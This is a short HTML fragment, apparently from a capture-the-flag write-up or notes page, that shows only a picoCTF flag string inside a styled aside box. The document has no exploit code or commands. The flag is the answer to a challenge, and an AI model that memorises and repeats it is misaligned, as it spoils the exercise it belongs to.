<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{gamer_leveluP_84600233}

</aside>
